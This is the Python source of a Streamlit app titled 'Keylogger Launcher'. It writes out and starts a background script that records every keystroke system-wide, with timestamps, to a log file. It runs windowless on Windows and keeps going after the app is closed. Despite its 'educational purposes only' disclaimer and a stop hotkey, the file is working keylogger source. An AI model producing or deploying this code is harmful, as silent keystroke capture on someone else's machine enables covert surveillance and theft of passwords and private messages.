import streamlit as st
import keyboard
import os
import sys
import subprocess
import tempfile
from datetime import datetime

# Streamlit Interface
st.set_page_config(page_title="Keylogger Launcher", page_icon="⌨️")
st.title("⌨️ Keyboard Activity Logger")

# Ethical disclaimer
st.warning("""
**IMPORTANT ETHICAL NOTICE:**
- This application is provided for **educational purposes only**
- Using keyloggers without explicit consent is illegal in most jurisdictions
- Always obtain written permission before monitoring keyboard activity
- Never use this code to collect sensitive information like passwords
""")

# Get log file location
st.subheader("Setup Logger")

# Simple directory input - just one field
directory_path = st.text_input("Directory Path", os.path.expanduser("~"))

# File name input
log_file = st.text_input("Log Filename", "keyboard_log.txt")

# Final path
log_path = os.path.join(directory_path, log_file)
st.write(f"Log will be saved to: **{log_path}**")

# Start button
if st.button("Start Keylogger"):
    # Create a temporary Python script for the background logger
    logger_code = f"""
import keyboard
import time
import os
from datetime import datetime

# The file path where keystrokes will be logged
log_path = r"{log_path}"

# Ensure the directory exists
os.makedirs(os.path.dirname(os.path.abspath(log_path)), exist_ok=True)

# Create or clear the log file
with open(log_path, "w") as f:
    f.write(f"--- Keyboard Activity Log Started at {{datetime.now()}} ---\\n")

# Flag for logging status
is_logging = True

# Function to handle key events
def log_key_event(event):
    if is_logging:
        with open(log_path, "a") as f:
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{{current_time}}] {{event.name}}\\n")

# Function to stop logging when Ctrl+Alt+Q is pressed
def stop_logging():
    global is_logging
    is_logging = False
    with open(log_path, "a") as f:
        f.write(f"--- Keyboard Activity Log Ended at {{datetime.now()}} ---\\n")
    keyboard.unhook_all()
    os._exit(0)

# Register the key event handler
keyboard.on_release(log_key_event)

# Register the stop hotkey (Ctrl+Alt+Q)
keyboard.add_hotkey('ctrl+alt+q', stop_logging)

# Keep the script running
print(f"Keylogger started. Logging to: {{log_path}}")
print("Press Ctrl+Alt+Q to stop logging.")

# Keep the program running
while is_logging:
    time.sleep(1)
"""

    # Create a temporary file for the logger script
    temp_dir = tempfile.gettempdir()
    script_path = os.path.join(temp_dir, "background_logger.py")
    
    with open(script_path, "w") as f:
        f.write(logger_code)
    
    # Run the logger in background
    try:
        if os.name == 'nt':  # Windows
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(['pythonw', script_path], 
                                      startupinfo=startupinfo,
                                      creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
        else:  # Linux/Mac
            process = subprocess.Popen(['python3', script_path],
                                      start_new_session=True)
        
        st.success(f"""
        Keylogger successfully started in background!
        
        - Logging to: {log_path}
        - Press **Ctrl+Alt+Q** to stop the keylogger
        
        You can close this window now. The keylogger will continue running in the background.
        """)
    except Exception as e:
        st.error(f"Failed to start keylogger: {str(e)}")

# Instructions
st.subheader("How to Use")
st.markdown("""
1. Enter the directory path where you want to save the log file
2. Enter a filename for the log
3. Click "Start Keylogger" to begin recording keystrokes in the background
4. Close this window after the keylogger starts
5. Press **Ctrl+Alt+Q** anytime to stop the keylogger

**Note:** This application requires administrator/root permissions to monitor keystrokes system-wide.
""")